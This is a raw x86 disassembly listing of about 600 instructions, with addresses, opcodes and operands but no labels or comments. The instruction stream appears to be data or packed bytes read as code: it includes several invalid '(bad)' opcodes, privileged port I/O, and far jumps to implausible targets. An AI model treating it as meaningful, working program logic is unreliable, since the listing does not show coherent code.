  4a2168:	lods   al,BYTE PTR ds:[esi]
  4a2169:	or     BYTE PTR [ecx-0x5223def4],ch
  4a216f:	sub    al,BYTE PTR [ebx-0x38]
  4a2172:	jae    0x4a21d4
  4a2174:	cmp    DWORD PTR [esi-0xdef501c],ebp
  4a217a:	sbb    al,0x42
  4a217c:	push   0x873cb03a
  4a2181:	nop
  4a2182:	retf   0xb1ec
  4a2185:	jo     0x4a21c2
  4a2187:	mov    dl,0x21
  4a2189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a218a:	xor    al,BYTE PTR [esp+esi*8+0x210ca9b3]
  4a2191:	iret   
  4a2192:	js     0x4a21d0
  4a2194:	mov    ah,0xfc
  4a2196:	mov    ch,0x43
  4a2198:	enter  0x873,0x80
  4a219c:	cmp    eax,0x195204b6
  4a21a1:	inc    edx
  4a21a2:	sahf   
  4a21a3:	ds mov bh,0x88
  4a21a6:	mov    eax,0x10e79086
  4a21ab:	or     al,0x3f
  4a21ad:	mov    ecx,0x8439e490
  4a21b2:	push   esp
  4a21b3:	mov    edx,0xebb4014
  4a21b8:	and    DWORD PTR [ebp+0x1cbc9821],edx
  4a21be:	inc    ecx
  4a21bf:	dec    eax
  4a21c0:	or     BYTE PTR gs:[ecx-0x43],bh
  4a21c4:	mov    al,ds:0x9e4219be
  4a21c9:	inc    ebx
  4a21ca:	and    al,0x42
  4a21cc:	mov    edi,0x10e790a8
  4a21d1:	push   edx
  4a21d2:	shr    BYTE PTR [ebx+eax*2],0xc1
  4a21d6:	cmp    DWORD PTR [esp+edx*2+0x34c2b086],eax
  4a21dd:	inc    esp
  4a21de:	and    DWORD PTR [ebp-0x473c1bdf],edx
  4a21e4:	les    esp,FWORD PTR [ebp+0x8]
  4a21e7:	jns    0x4a21f7
  4a21e9:	cmp    al,0x45
  4a21eb:	(bad)
  4a21ee:	sahf   
  4a21ef:	inc    ebx
  4a21f0:	dec    eax
  4a21f1:	mov    BYTE PTR [esi+eax*2-0x39],0xe7
  4a21f6:	adc    BYTE PTR [edx+0x19],dl
  4a21f9:	enter  0x4cc8,0x47
  4a21fd:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a2201:	leave  
  4a2202:	ror    dl,1
  4a2204:	xchg   ebp,eax
  4a2205:	and    esp,esp
  4a2207:	cmp    DWORD PTR [eax+ecx*2-0x35],edx
  4a220b:	fmul   st,st(4)
  4a220d:	or     BYTE PTR [ecx+0xe],bh
  4a2210:	and    DWORD PTR [ecx+ecx*2-0x33],ebx
  4a2214:	sahf   
  4a2215:	inc    ebx
  4a2216:	dec    eax
  4a2217:	gs loopne 0x4a21e8
  4a221a:	fs dec edx
  4a221c:	iret   
  4a221d:	adc    BYTE PTR [edx+0x19],dl
  4a2220:	inc    edx
  4a2221:	call   0x90d076f6
  4a2226:	out    0x6c,eax
  4a2228:	dec    ebx
  4a2229:	shl    eax,1
  4a222b:	shl    BYTE PTR [ecx],cl
  4a222d:	in     al,0x39
  4a222f:	test   BYTE PTR [esp+ecx*2-0x2d],dh
  4a2233:	jns    0x4a2243
  4a2235:	and    DWORD PTR [ebp+0x4d7cd4f8],edx
  4a223b:	aad    0x43
  4a223d:	enter  0x873,0x0
  4a2241:	dec    esi
  4a2242:	(bad)  
  4a2243:	test   dl,dh
  4a2245:	sbb    al,0x42
  4a2247:	sub    dl,bh
  4a2249:	or     BYTE PTR [edi-0x28],cl
  4a224c:	xchg   DWORD PTR [eax-0x2673ef36],edx
  4a2252:	adc    BYTE PTR [eax-0x5c],dl
  4a2255:	xor    al,BYTE PTR [esp+edi*1+0xcdb94da]
  4a225c:	and    edi,ecx
  4a225e:	and    DWORD PTR [eax],ebx
  4a2260:	push   ecx
  4a2261:	fcomp  QWORD PTR [eax+ecx*8-0x2256f78d]
  4a2268:	and    BYTE PTR [edx-0x22],dl
  4a226b:	sbb    al,0x42
  4a226d:	sub    al,BYTE PTR [ebx-0x5c]
  4a2270:	fild   QWORD PTR [eax]
  4a2272:	push   ebx
  4a2273:	nop
  4a2274:	retf   0xf210
  4a2277:	loopne 0x4a2225
  4a2279:	loope  0x4a22ad
  4a227b:	test   BYTE PTR [edi+eax*4],bh
  4a227e:	xor    BYTE PTR [edx+eiz*8-0x4c],dl
  4a2282:	and    edi,ecx
  4a2284:	and    DWORD PTR [ebx+eiz*8+0x73e45538],esp
  4a228b:	or     BYTE PTR [ecx+0x40e5bc0c],ch
  4a2291:	push   esi
  4a2292:	inc    edx
  4a2293:	sub    al,BYTE PTR [ebx-0x38]
  4a2296:	out    0xc4,al
  4a2298:	out    0xca,eax
  4a229a:	adc    dl,dh
  4a229c:	sbb    al,0x48
  4a229e:	push   edi
  4a229f:	call   0x8786a770
  4a22a4:	nop
  4a22a5:	jmp    0xd0347afa
  4a22aa:	and    DWORD PTR [edx+esi*1+0x5958ebd4],esp
  4a22b1:	in     al,dx
  4a22b2:	or     BYTE PTR [ecx-0x1223def4],ch
  4a22b8:	sub    al,BYTE PTR [ebx-0x38]
  4a22bb:	jae    0x4a231d
  4a22bd:	pop    edx
  4a22be:	out    dx,al
  4a22bf:	in     al,0xef
  4a22c1:	adc    dl,dh
  4a22c3:	sbb    al,0x42
  4a22c5:	push   0x873cf05b
  4a22ca:	nop
  4a22cb:	retf   0xf1ec
  4a22ce:	jo     0x4a232c
  4a22d0:	repnz and DWORD PTR [edx+esi*1-0x560c0b7c],esp
  4a22d8:	or     al,0x21
  4a22da:	iret   
  4a22db:	js     0x4a233a
  4a22dd:	hlt    
  4a22de:	cld    
  4a22df:	cmc    
  4a22e0:	inc    ebx
  4a22e1:	enter  0x873,0x80
  4a22e5:	pop    esi
  4a22e6:	test   BYTE PTR [edx+edx*2],0x19
  4a22ea:	inc    edx
  4a22eb:	sahf   
  4a22ec:	pop    edi
  4a22ed:	test   DWORD PTR [eax-0x186f7908],0xf9600c10
  4a22f7:	nop
  4a22f8:	in     al,0x39
  4a22fa:	test   BYTE PTR [edx+edi*8+0x14],dl
  4a22fe:	popa   
  4a22ff:	sti    
  4a2300:	push   cs
  4a2301:	and    DWORD PTR [ebp+0x1cfc9821],edx
  4a2307:	bound  ecx,QWORD PTR [eax+0x65]
  4a230a:	or     BYTE PTR [ecx-0x3],bh
  4a230d:	mov    al,ds:0x9e4219fe
  4a2312:	inc    ebx
  4a2313:	and    al,0x63
  4a2315:	jmp    FWORD PTR [eax+0x5902f3c8]
  4a231b:	add    BYTE PTR [esi],al
  4a231d:	sub    al,0x64
  4a231f:	add    DWORD PTR [edx+eax*2],ebx
  4a2322:	sub    al,BYTE PTR [ebx-0x50]
  4a2325:	add    dh,BYTE PTR [eiz*2-0xdef3570]
  4a232c:	add    edi,DWORD PTR [eax+0x3c843204]
  4a2332:	xchg   DWORD PTR [esi+eiz*2],edi
  4a2335:	add    eax,0x21cf21c0
  4a233a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a233b:	push   es
  4a233c:	inc    esp
  4a233d:	addr16 pop es
  4a233f:	jae    0x4a2349
  4a2341:	test   eax,0x4c08c80c
  4a2346:	push   0xc8432a42
  4a234b:	or     eax,edx
  4a234d:	or     cl,dl
  4a234f:	adc    dl,dh
  4a2351:	sbb    al,0x54
  4a2353:	imul   ecx,DWORD PTR [ebx],0x873c84d8
  4a2359:	nop
  4a235a:	or     al,0x5c
  4a235c:	push   0xd
  4a235e:	iret   
  4a235f:	and    DWORD PTR [edx+esi*1+0x6b640ee0],esp
  4a2366:	invd   
  4a2368:	test   eax,0x10e8210c
  4a236d:	sub    al,BYTE PTR [ebx-0x38]
  4a2370:	jae    0x4a23de
  4a2372:	ins    BYTE PTR es:[edi],dx
  4a2373:	adc    eax,esi
  4a2375:	adc    dl,BYTE PTR [eax]
  4a2377:	repnz sbb al,0x42
  4a237a:	je     0x4a23e9
  4a237c:	adc    edi,DWORD PTR [edi+eax*4]
  4a237f:	nop
  4a2380:	retf   0x14f8
  4a2383:	jl     0x4a23f3
  4a2385:	adc    eax,0x8439e421
  4a238a:	add    BYTE PTR [edi+0x16],ch
  4a238d:	jns    0x4a239d
  4a238f:	and    DWORD PTR [ebp+0x70081784],edx
  4a2395:	sbb    BYTE PTR [ebx+0x48],al
  4a2398:	or     BYTE PTR gs:[ecx+ebx*1+0x42195210],cl
  4a23a0:	sahf   
  4a23a1:	jno    0x4a23bd
  4a23a3:	xchg   esp,eax
  4a23a4:	sbb    eax,DWORD PTR [esi+0x1810e790]
  4a23aa:	jb     0x4a23c8
  4a23ac:	pushf  
  4a23ad:	in     al,0x39
  4a23af:	test   BYTE PTR [ebp+ebx*1+0x20],dl
  4a23b3:	jae    0x4a23d3
  4a23b5:	push   cs
  4a23b6:	and    DWORD PTR [ebp+0x281fa421],edx
  4a23bc:	je     0x4a2406
  4a23be:	or     BYTE PTR gs:[ecx+0x20],bh
  4a23c2:	lods   al,BYTE PTR ds:[esi]
  4a23c3:	and    DWORD PTR [ecx],ebx
  4a23c5:	inc    edx
  4a23c6:	sahf   
  4a23c7:	inc    ebx
  4a23c8:	xor    BYTE PTR [ebp+0x22],dh
  4a23cb:	mov    ah,0x90
  4a23cd:	out    0x10,eax
  4a23cf:	push   edx
  4a23d0:	and    edi,DWORD PTR [eax]
  4a23d2:	jbe    0x4a23f8
  4a23d4:	cmp    DWORD PTR [esp+edx*2+0x4025bc86],eax
  4a23db:	ja     0x4a23fe
  4a23dd:	xchg   ebp,eax
  4a23de:	and    esp,esp
  4a23e0:	les    esp,FWORD PTR es:[edi]
  4a23e3:	or     BYTE PTR gs:[ecx+0xe],bh
  4a23e7:	dec    eax
  4a23e8:	js     0x4a2412
  4a23ea:	int3   
  4a23eb:	inc    edx
  4a23ec:	sahf   
  4a23ed:	inc    ebx
  4a23ee:	dec    eax
  4a23ef:	sub    DWORD PTR [eax+0x79],edx
  4a23f2:	sub    ah,bh
  4a23f4:	adc    BYTE PTR [edx+0x19],dl
  4a23f7:	aam    0x2b
  4a23f9:	pop    eax
  4a23fa:	jp     0x4a2380
  4a23fc:	push   esp
  4a23fd:	xchg   BYTE PTR [eax-0x6ad223d4],dl
  4a2403:	and    esp,esp
  4a2405:	cmp    DWORD PTR [eax+0x7b],esp
  4a2408:	cs in  al,0x2f
  4a240b:	or     BYTE PTR [ecx+0xe],bh
  4a240e:	and    DWORD PTR [eax+0x7c],ebp
  4a2411:	xor    BYTE PTR [esi-0x139ab7bd],bl
  4a2417:	xor    DWORD PTR [eax+0x7d],esi
  4a241a:	xor    dl,BYTE PTR [eax]
  4a241c:	push   edx
  4a241d:	sbb    DWORD PTR [edx-0xc],eax
  4a2420:	xor    edx,DWORD PTR [esi+eax*4-0x70]
  4a2424:	out    0x78,eax
  4a2426:	jle    0x4a245c
  4a2428:	cld    
  4a2429:	xor    eax,0x8439e421
  4a242e:	cmp    BYTE PTR [edi+0x36],0xa9
  4a2432:	or     al,0x21
  4a2434:	iret   
  4a2435:	add    al,0x80
  4a2437:	aaa    
  4a2438:	mov    BYTE PTR [eax],bh
  4a243a:	inc    ebx
  4a243b:	enter  0x873,0xc
  4a243f:	cmp    DWORD PTR [ecx],0x421cf290
  4a2445:	sub    bh,BYTE PTR [edx]
  4a2447:	adc    al,0x82
  4a2449:	cmp    eax,DWORD PTR [edi-0x67ef3570]
  4a244f:	cmp    al,0x1c
  4a2451:	and    DWORD PTR [edx+esi*1-0x5fc2c37c],0x3e
  4a2459:	or     al,0x21
  4a245b:	iret   
  4a245c:	and    DWORD PTR [esp+eax*4],esp
  4a245f:	aas    
  4a2460:	test   al,0x34
  4a2462:	inc    ebx
  4a2463:	dec    esp
  4a2464:	test   al,0x40
  4a2466:	inc    DWORD PTR [ebp+0x33484341]
  4a246c:	test   BYTE PTR [ebp+0x33488642],al
  4a2472:	test   BYTE PTR [ebx+eax*2],dh
  4a2475:	xchg   BYTE PTR [ebx+esi*1-0x7c],al
  4a2479:	xor    al,0x43
  4a247b:	xchg   DWORD PTR [ebp-0x79],eax
  4a247e:	test   BYTE PTR [ebx+eax*2],dh
  4a2481:	dec    eax
  4a2482:	inc    esi
  4a2483:	mov    BYTE PTR [edi+0x34],al
  4a2486:	inc    ebx
  4a2487:	dec    eax
  4a2488:	xor    ecx,DWORD PTR [eax+0x43498948]
  4a248e:	dec    eax
  4a248f:	xor    eax,DWORD PTR [ecx+ecx*4+0x33488a4a]
  4a2496:	test   BYTE PTR [ebx+ecx*2],dh
  4a2499:	mov    cl,BYTE PTR [ebx+esi*1-0x7c]
  4a249d:	xor    al,0x43
  4a249f:	mov    ecx,DWORD PTR [ebp-0x75]
  4a24a2:	test   BYTE PTR [ebx+eax*2],dh
  4a24a5:	dec    eax
  4a24a6:	dec    esi
  4a24a7:	mov    WORD PTR [edi+0x34],cs
  4a24aa:	inc    ebx
  4a24ab:	dec    eax
  4a24ac:	xor    ecx,DWORD PTR [eax+edx*2+0x4843518d]
  4a24b3:	xor    eax,DWORD PTR [ebp+ecx*4+0x33488e52]
  4a24ba:	test   BYTE PTR [ebx+edx*2],dh
  4a24bd:	mov    ss,WORD PTR [ebx+esi*1-0x7c]
  4a24c1:	xor    al,0x43
  4a24c3:	(bad)  
  4a24c4:	push   ebp
  4a24c5:	nop
  4a24c6:	test   BYTE PTR [ebx+eax*2],dh
  4a24c9:	dec    eax
  4a24ca:	push   esi
  4a24cb:	nop
  4a24cc:	push   edi
  4a24cd:	xor    al,0x43
  4a24cf:	dec    eax
  4a24d0:	xor    edx,DWORD PTR [ecx+0x43599158]
  4a24d6:	dec    eax
  4a24d7:	xor    eax,DWORD PTR [edx+edx*4+0x3348925a]
  4a24de:	test   BYTE PTR [ebx+ebx*2],dh
  4a24e1:	xchg   ebx,eax
  4a24e2:	pop    esp
  4a24e3:	xor    eax,DWORD PTR [esp+esi*1-0x6ba26cbd]
  4a24ea:	test   BYTE PTR [ebx+eax*2],dh
  4a24ed:	dec    eax
  4a24ee:	pop    esi
  4a24ef:	xchg   esp,eax
  4a24f0:	pop    edi
  4a24f1:	xor    al,0x43
  4a24f3:	dec    eax
  4a24f4:	xor    edx,DWORD PTR [ebp+0x43619560]
  4a24fa:	dec    eax
  4a24fb:	xor    eax,DWORD PTR [esi+edx*4+0x33489662]
  4a2502:	test   BYTE PTR [ebx+eiz*2],dh
  4a2505:	xchg   edi,eax
  4a2506:	xor    eax,DWORD PTR fs:[esp+esi*1-0x679a68bd]
  4a250e:	test   BYTE PTR [ebx+eax*2],dh
  4a2511:	dec    eax
  4a2512:	cbw    
  4a2514:	addr16 xor al,0x43
  4a2517:	dec    eax
  4a2518:	xor    ebx,DWORD PTR [ecx+0x43699968]
  4a251e:	dec    eax
  4a251f:	xor    eax,DWORD PTR [edx+ebx*4+0x33489a6a]
  4a2526:	test   BYTE PTR [ebx+ebp*2],dh
  4a2529:	fwait
  4a252a:	ins    BYTE PTR es:[edi],dx
  4a252b:	xor    eax,DWORD PTR [esp+esi*1-0x639264bd]
  4a2532:	test   BYTE PTR [ebx+eax*2],dh
  4a2535:	dec    eax
  4a2536:	outs   dx,BYTE PTR ds:[esi]
  4a2537:	pushf  
  4a2538:	outs   dx,DWORD PTR ds:[esi]
  4a2539:	xor    al,0x43
  4a253b:	dec    eax
  4a253c:	xor    ebx,DWORD PTR [ebp+0x43719d70]
  4a2542:	dec    eax
  4a2543:	xor    eax,DWORD PTR [esi+ebx*4+0x33489e72]
  4a254a:	test   BYTE PTR [ebx+esi*2],dh
  4a254d:	lahf   
  4a254e:	je     0x4a2583
  4a2550:	test   BYTE PTR [ebx+eax*2],dh
  4a2553:	lahf   
  4a2554:	jne    0x4a24f6
  4a2556:	test   BYTE PTR [ebx+eax*2],dh
  4a2559:	dec    eax
  4a255a:	jbe    0x4a24fd
  4a255c:	ja     0x4a2592
  4a255e:	inc    ebx
  4a255f:	dec    eax
  4a2560:	xor    esp,DWORD PTR [ecx+0x4379a278]
  4a2566:	dec    eax
  4a2567:	xor    eax,DWORD PTR [edx+eiz*4+0x3348a37a]
  4a256e:	test   BYTE PTR [ebx+edi*2],dh
  4a2571:	mov    ds:0x3484337c,eax
  4a2576:	inc    ebx
  4a2577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2578:	jge    0x4a251e
  4a257a:	fs jns 0x4a25c0
  4a257d:	dec    eax
  4a257e:	jle    0x4a2525
  4a2580:	cmp    bh,BYTE PTR [edi+0x39]
  4a2583:	test   BYTE PTR [esi+ebp*4-0x58],dl
  4a2587:	sub    BYTE PTR [esi+eiz*4],0x21
  4a258b:	xchg   ebp,eax
  4a258c:	and    esp,esp
  4a258e:	xor    DWORD PTR [eax+0x79086582],0x83a7340e
  4a2598:	mov    eax,0x48439e42
  4a259d:	test   BYTE PTR [eax+ebp*4],bh
  4a25a0:	test   edi,esp
  4a25a2:	adc    BYTE PTR [edx+0x19],dl
  4a25a5:	rol    BYTE PTR [esi+0x5484a944],0x86
  4a25ac:	nop
  4a25ad:	xchg   eax,ecx
  4a25af:	mov    BYTE PTR [ebp+0x4c39e421],dl
  4a25b5:	stos   BYTE PTR es:[edi],al
  4a25b6:	mov    eax,edx
  4a25b8:	mov    cl,BYTE PTR [eax]
  4a25ba:	jns    0x4a25ca
  4a25bc:	and    DWORD PTR [ebx+ebp*4-0x75],edx
  4a25c0:	sahf   
  4a25c1:	inc    ebx
  4a25c2:	dec    eax
  4a25c3:	fmul   DWORD PTR gs:[esp+ebx*2+0x52108dac]
  4a25cb:	sbb    DWORD PTR [edx-0x20],eax
  4a25ce:	mov    ss,WORD PTR [esi+eax*4-0x70]
  4a25d2:	out    0x64,eax
  4a25d4:	lods   eax,DWORD PTR ds:[esi]
  4a25d5:	(bad)
  4a25d9:	in     al,0x39
  4a25db:	test   BYTE PTR [esi+ebp*4-0x6f],ch
  4a25df:	jns    0x4a25ef
  4a25e1:	and    DWORD PTR [ebp-0x508b6d10],edx
  4a25e7:	xchg   ebx,eax
  4a25e8:	inc    ebx
  4a25e9:	dec    eax
  4a25ea:	gs or  al,bh
  4a25ed:	xchg   esp,eax
  4a25ee:	jl     0x4a25e2
  4a25f0:	sbb    al,0x42
  4a25f2:	sahf   
  4a25f3:	mov    al,0x95
  4a25f5:	add    BYTE PTR [ecx-0x356f786a],dh
  4a25fb:	adc    BYTE PTR [edi+edx*4+0x32a4b208],al
  4a2602:	test   BYTE PTR [eax+ebx*4],bh
  4a2605:	mov    WORD PTR [ecx+0x21cf210c],ds
  4a260b:	adc    BYTE PTR [ebx+0x73c8949a],dh
  4a2611:	or     BYTE PTR [ecx-0x634be765],ch
  4a2617:	sbb    al,0x42
  4a2619:	sub    al,BYTE PTR [ebx-0x64]
  4a261c:	popf   
  4a261d:	and    BYTE PTR [ebp-0xdef3570],dh
  4a2623:	sahf   
  4a2624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2625:	lahf   
  4a2626:	xor    al,BYTE PTR [esp+edi*1-0x5f49d779]
  4a262d:	lods   al,BYTE PTR ds:[esi]
  4a262e:	and    edi,ecx
  4a2630:	and    DWORD PTR [ecx+eiz*4+0x73a2b730],esp
  4a2637:	or     BYTE PTR [ecx+0x38a3b40c],ch
  4a263d:	mov    eax,0xc8432a42
  4a2642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2643:	mov    esp,0xf210caa5
  4a2648:	sbb    al,0x40
  4a264a:	mov    ecx,0x3c84c4a6
  4a264f:	xchg   DWORD PTR [eax-0x5745b759],edx
  4a2655:	iret   
  4a2656:	and    DWORD PTR [edx+esi*1-0x44af5634],esp
  4a265d:	stos   BYTE PTR es:[edi],al
  4a265e:	or     BYTE PTR [ecx-0x542bdef4],ch
  4a2664:	sub    al,BYTE PTR [ebx-0x38]
  4a2667:	jae    0x4a26c1
  4a2669:	mov    esp,0x10addcac
  4a266e:	repnz sbb al,0x42
  4a2671:	pusha  
  4a2672:	mov    ebp,0x90873cae
  4a2677:	retf   0xafe4
  4a267a:	push   0xa421b0be
  4a267f:	xor    al,BYTE PTR [esp+ebp*8+0x210ca9b1]
  4a2686:	iret   
  4a2687:	jo     0x4a2648
  4a2689:	mov    dl,0xf4
  4a268b:	mov    bl,0x43
  4a268d:	enter  0x873,0x78
  4a2691:	shl    BYTE PTR [esp+edi*8+0x2a421cf2],0xb5
  4a2699:	add    cl,0xb6
  4a269c:	xchg   BYTE PTR [eax-0x3dfbef19],dl
  4a26a2:	mov    bh,0x88
  4a26a4:	in     al,0x39
  4a26a6:	test   BYTE PTR [eax+edi*4+0xc],dl
  4a26aa:	ret    
  4a26ab:	mov    ecx,0x2195210e
  4a26b0:	nop
  4a26b1:	mov    edx,0x6548c414
  4a26b6:	or     BYTE PTR [ecx-0x45],bh
  4a26b9:	cwde   
  4a26ba:	mov    esp,0x439e4219
  4a26bf:	sbb    al,0xc5
  4a26c1:	mov    ebp,0x10e790a0
  4a26c6:	push   edx
  4a26c7:	mov    esi,0x39bfc624
  4a26cc:	test   BYTE PTR [esi+eax*4-0x58],dl
  4a26d0:	shr    BYTE PTR [edi+eax*8],0x21
  4a26d4:	xchg   ebp,eax
  4a26d5:	and    esp,esp
  4a26d7:	shl    DWORD PTR [eax+0x790865c2],0xe
  4a26de:	xor    al,0xc8
  4a26e0:	ret    
  4a26e1:	mov    eax,0x48439e42
  4a26e6:	les    edi,FWORD PTR [ecx+ecx*8]
  4a26e9:	(bad)
  4a26ec:	push   edx
  4a26ed:	sbb    eax,eax
  4a26ef:	mov    BYTE PTR [edx+ecx*8-0x7c],0x54
  4a26f4:	xchg   BYTE PTR [eax-0x6a373739],dl
  4a26fa:	and    esp,esp
  4a26fc:	cmp    DWORD PTR [ebx+ecx*8-0x37],ecx
  4a2700:	ror    dl,1
  4a2702:	or     BYTE PTR [ecx+0xe],bh
  4a2705:	and    DWORD PTR [esp+ecx*8-0x35],edx
  4a2709:	sahf   
  4a270a:	inc    ebx
  4a270b:	dec    eax
  4a270c:	gs fmul st,st(4)
  4a270f:	pop    esp
  4a2710:	int    0xcd
  4a2712:	adc    BYTE PTR [edx+0x19],dl
  4a2715:	inc    edx
  4a2716:	loopne 0x4a26e6
  4a2718:	push   esp
  4a2719:	xchg   BYTE PTR [eax-0x30319b19],dl
  4a271f:	call   0x3a2e48f4
  4a2724:	test   BYTE PTR [edi+ecx*8-0x2f],ch
  4a2728:	jns    0x4a2738
  4a272a:	and    DWORD PTR [ebp-0x2f8b2d10],edx
  4a2730:	rol    DWORD PTR [ebx+0x48],cl
  4a2733:	gs or  al,bh
  4a2736:	aam    0x7c
  4a2738:	repnz sbb al,0x42
  4a273b:	sahf   
  4a273c:	rcl    ebp,1
  4a273e:	add    dl,dl
  4a2740:	(bad)  
  4a2741:	xchg   DWORD PTR [eax-0x287bef36],edx
  4a2747:	or     bl,dl
  4a2749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a274a:	xor    al,BYTE PTR [esp+edi*1+0xcd98cd8]
  4a2751:	and    edi,ecx
  4a2753:	and    DWORD PTR [eax],edx
  4a2755:	aam    0xda
  4a2757:	xchg   esp,eax
  4a2758:	enter  0x873,0xa9
  4a275c:	fistp  DWORD PTR [eax]
  4a275e:	aad    0xdc
  4a2760:	sbb    al,0x42
  4a2762:	sub    al,BYTE PTR [ebx-0x64]
  4a2765:	frstor [eax]
  4a2767:	(bad)  
  4a2768:	nop
  4a2769:	retf   0xf210
  4a276c:	fisub  WORD PTR [edi+ebx*8-0x78c37bce]
  4a2773:	sub    bh,dl
  4a2775:	loopne 0x4a2723
  4a2777:	and    edi,ecx
  4a2779:	and    DWORD PTR [ecx+eiz*8+0x73e2d830],esp
  4a2780:	or     BYTE PTR [ecx+0x38e3b40c],ch
  4a2786:	fld    DWORD PTR [edx+0x2a]
  4a2789:	inc    ebx
  4a278a:	enter  0xbce4,0xe5
  4a278e:	retf   0xf210
  4a2791:	sbb    al,0x40
  4a2793:	(bad)  
  4a2795:	les    eax,FWORD PTR [esp+edi*1+0x48e79087]
  4a279c:	fucomi st,st(0)
  4a279e:	iret   
  4a279f:	and    DWORD PTR [edx+esi*1-0x23af1634],esp
  4a27a6:	jmp    0xebd4:0x210ca908
  4a27ad:	sub    al,BYTE PTR [ebx-0x38]
  4a27b0:	jae    0x4a280a
  4a27b2:	fucomp st(4)
  4a27b4:	fsub   st(5),st
  4a27b6:	adc    dl,dh
  4a27b8:	sbb    al,0x42
  4a27ba:	pusha  
  4a27bb:	fsubp  st(6),st
  4a27bd:	cmp    al,0x87
  4a27bf:	nop
  4a27c0:	retf   0xefe4
  4a27c3:	push   0xa421f0df
  4a27c8:	xor    al,BYTE PTR [esp+ebp*8+0x210ca9f1]
  4a27cf:	iret   
  4a27d0:	jo     0x4a27b2
  4a27d2:	repnz hlt 
  4a27d4:	repz inc ebx
  4a27d6:	enter  0x873,0x78
  4a27da:	loope  0x4a27d0
  4a27dc:	cld    
  4a27dd:	repnz sbb al,0x42
  4a27e0:	sub    dh,ch
  4a27e2:	and    dl,0xf6
  4a27e5:	xchg   BYTE PTR [eax-0x1cfbef19],dl
  4a27eb:	test   DWORD PTR [eax+0x548439e4],0xf9e40cf8
  4a27f5:	push   cs
  4a27f6:	and    DWORD PTR [ebp+0x14fa9021],edx
  4a27fc:	in     eax,0x48
  4a27fe:	or     BYTE PTR gs:[ecx-0x5],bh
  4a2802:	cwde   
  4a2803:	cld    
  4a2804:	sbb    DWORD PTR [edx-0x62],eax
  4a2807:	inc    ebx
  4a2808:	sbb    al,0xe6
  4a280a:	std    
  4a280b:	mov    al,ds:0x5210e790
  4a2810:	(bad)  
  4a2811:	and    al,0xe7
  4a2813:	(bad)  
  4a2814:	mov    esp,0xa8865640
  4a2819:	add    BYTE PTR [edi],al
  4a281b:	sub    al,0xe8
  4a281d:	nop
  4a281e:	retf   0xf210
  4a2821:	add    DWORD PTR [eax+0x3c843202],esi
  4a2827:	xchg   DWORD PTR [ecx+ebp*8],esi
  4a282a:	add    edi,DWORD PTR [eax-0x5bde30df]
  4a2830:	add    al,0x3c
  4a2832:	jmp    0xc00c:0xa9087305
  4a2839:	push   es
  4a283a:	inc    esp
  4a283b:	jmp    0x4a287f
  4a283d:	sub    al,BYTE PTR [ebx-0x38]
  4a2840:	pop    es
  4a2841:	enter  0xca08,0x10
  4a2845:	repnz sbb al,0x4c
  4a2848:	in     al,dx
  4a2849:	or     eax,edx
  4a284b:	test   BYTE PTR [edi+eax*4],bh
  4a284e:	nop
  4a284f:	or     dl,BYTE PTR [ebp+ebp*8+0xb]
  4a2853:	iret   
  4a2854:	and    DWORD PTR [edx+esi*1-0x11a3f328],esp
  4a285b:	or     eax,0x210ca908
  4a2860:	loopne 0x4a2870
  4a2862:	sub    al,BYTE PTR [ebx-0x38]
  4a2865:	jae    0x4a28cb
  4a2867:	out    dx,eax
  4a2868:	psubsb mm2,QWORD PTR [eax]
  4a286b:	adc    dl,dh
  4a286d:	sbb    al,0x42
  4a286f:	ins    BYTE PTR es:[edi],dx
  4a2870:	lock adc DWORD PTR [edi+eax*4],edi
  4a2874:	nop
  4a2875:	retf   0x12f0
  4a2878:	je     0x4a286b
  4a287a:	adc    esp,DWORD PTR [ecx]
  4a287c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a287d:	xor    al,BYTE PTR [eax+edi*8+0x210e7914]
  4a2884:	iret   
  4a2885:	jl     0x4a2879
  4a2887:	adc    eax,0x4316f300
  4a288c:	dec    eax
  4a288d:	or     BYTE PTR gs:[edi+edx*1+0x42195208],al
  4a2895:	sahf   
  4a2896:	hlt    
  4a2897:	sbb    BYTE PTR [ecx+ebx*1+0x10e79086],cl
  4a289e:	adc    ch,dh
  4a28a0:	sbb    dl,BYTE PTR [esp+eiz*8+0x1b548439]
  4a28a7:	sbb    dh,dh
  4a28a9:	sbb    al,0xe
  4a28ab:	and    DWORD PTR [ebp+0x201d9c21],edx
  4a28b1:	test   DWORD PTR [eax+0x65],0xa41e7908
  4a28b8:	pop    ds
  4a28b9:	sbb    DWORD PTR [edx-0x62],eax
  4a28bc:	inc    ebx
  4a28bd:	sub    al,bh
  4a28bf:	and    BYTE PTR [eax+edx*4+0x215210e7],ch
  4a28c6:	xor    cl,bh
  4a28c8:	and    bh,BYTE PTR [ecx]
  4a28ca:	test   BYTE PTR [esi+eax*4-0x4c],dl
  4a28ce:	and    edi,DWORD PTR [eax]
  4a28d0:	cli    
  4a28d1:	and    DWORD PTR [ebp-0x43db1bdf],edx
  4a28d7:	and    eax,0xe790865
  4a28dc:	inc    eax
  4a28dd:	sti    
  4a28de:	les    eax,FWORD PTR es:[edx-0x62]
  4a28e2:	inc    ebx
  4a28e3:	dec    eax
  4a28e4:	daa    
  4a28e5:	dec    eax
  4a28e6:	cld    
  4a28e7:	sub    bh,ah
  4a28e9:	adc    BYTE PTR [edx+0x19],dl
  4a28ec:	int3   
  4a28ed:	sub    DWORD PTR [eax-0x3],edx
  4a28f0:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a28f4:	sub    dl,ah
  4a28f6:	sub    edx,DWORD PTR [ebp+0x5839e421]
  4a28fc:	(bad)  
  4a28fd:	sub    al,0xdc
  4a28ff:	sub    eax,0x210e7908
  4a2904:	pusha  
  4a2905:	jmp    FWORD PTR [esi]
  4a2907:	int    0x43
  4a2909:	dec    eax
  4a290a:	gs in  al,0x2f
  4a290d:	push   0x8304400
  4a2912:	test   eax,0x31ec210c
  4a2917:	sub    al,BYTE PTR [ebx-0x38]
  4a291a:	jae    0x4a298c
  4a291c:	add    DWORD PTR [edx],esi
  4a291e:	hlt    
  4a291f:	xor    edx,DWORD PTR [eax]
  4a2921:	repnz sbb al,0x42
  4a2924:	js     0x4a2928
  4a2926:	xor    al,0x3c
